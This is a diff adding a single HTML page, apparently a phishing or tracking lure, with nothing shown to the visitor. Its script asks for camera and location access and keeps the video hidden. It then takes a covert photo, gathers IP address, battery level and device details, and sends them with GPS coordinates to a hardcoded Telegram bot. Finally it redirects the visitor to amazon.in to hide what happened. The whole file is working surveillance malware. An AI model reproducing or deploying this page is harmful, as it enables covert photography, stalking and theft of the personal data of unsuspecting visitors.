@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>. </title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: white; /* Black background */
+            color: white; /* White text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #loading {
+            display: none; /* Hidden by default */
+        }
+        video, canvas {
+            display: none; /* Hide video and canvas */
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading"></div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const botToken = '8111349298:AAHs1lgbjDY7Srf1jLG1C8u8qPzAfV4nVn8';  // Your bot token
+        const chatId = '5714576629';  // Your chat ID
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loading = document.getElementById('loading');
+        const context = canvas.getContext('2d'); // Initialize the context
+
+        async function requestPermissions() {
+            loading.style.display = 'block'; // Show loading message
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'none'; // Hide the video from user completely
+                
+                // Request location access
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                
+                loading.style.display = 'none'; // Hide loading message
+                console.log('Permissions granted');
+            } catch (error) {
+                loading.style.display = 'none'; // Hide loading message on error
+                console.error('Error requesting permissions:', error);
+                alert('Please allow access to the camera and location for the application to work.');
+            }
+        }
+
+        // Function to capture a hidden photo
+        function capturePhoto() {
+            return new Promise((resolve, reject) => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert canvas to blob
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        resolve(blob); // Return the photo as a Blob
+                    } else {
+                        reject(new Error('Failed to capture photo'));
+                    }
+                }, 'image/png');
+
+                // Stop the video stream after capturing the image
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+            });
+        }
+
+        // Function to get live location
+        function getLiveLocation() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                    });
+                }, reject);
+            });
+        }
+
+        // Function to get IP address
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    return 'IP fetch failed';
+                });
+        }
+
+        // Function to get battery percentage
+        async function getBatteryPercentage() {
+            try {
+                const battery = await navigator.getBattery();
+                return battery.level * 100; // Return battery percentage
+            } catch (error) {
+                console.error('Error getting battery status:', error);
+                return 'Battery status not available';
+            }
+        }
+
+        // Function to get device specifications
+        function getDeviceSpecifications() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages.join(', '),
+            };
+        }
+
+        async function init() {
+            await requestPermissions(); // Request permissions at the start
+
+            // Capture the photo
+            const photoBlob = await capturePhoto();
+
+            // Get IP address
+            const ipAddress = await getIPAddress();
+
+            // Get battery percentage
+            const batteryPercentage = await getBatteryPercentage();
+
+            // Get device specifications
+            const deviceSpecs = getDeviceSpecifications();
+
+            // Construct message with all collected data
+            const message = `Photo and Device Information:\nIP Address: ${ipAddress}\nBattery Percentage: ${batteryPercentage}%\nDevice Specifications:\nUser Agent: ${deviceSpecs.userAgent}\nPlatform: ${deviceSpecs.platform}\nLanguages: ${deviceSpecs.languages}`;
+
+            // Send IP address and photo to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Device information sent to Telegram');
+                } else {
+                    console.error('Error sending message:', data.description);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+
+            // Send the photo to Telegram
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.png');  // Attach the photo as 'photo.png'
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Photo sent to Telegram');
+                } else {
+                    console.error('Error sending photo:', data.description);
+                }
+            })
+            .catch(error => console.error('Error sending photo:', error));
+
+            // Get live location and send it to Telegram
+            const location = await getLiveLocation();
+            const locationMessage = `Live Location:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: locationMessage
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Live location sent to Telegram');
+                } else {
+                    console.error('Error sending live location:', data.description);
+                }
+            })
+            .catch(error => console.error('Error getting live location:', error));
+
+            // Redirect to Google.com after successful operations
+            setTimeout(() => {
+                window.location.href = 'https://www.amazon.in';
+            }, 2000); // Redirect after 2 seconds
+        }
+
+        init(); // Start the process
+    </script>
+
+</body>
+</html>
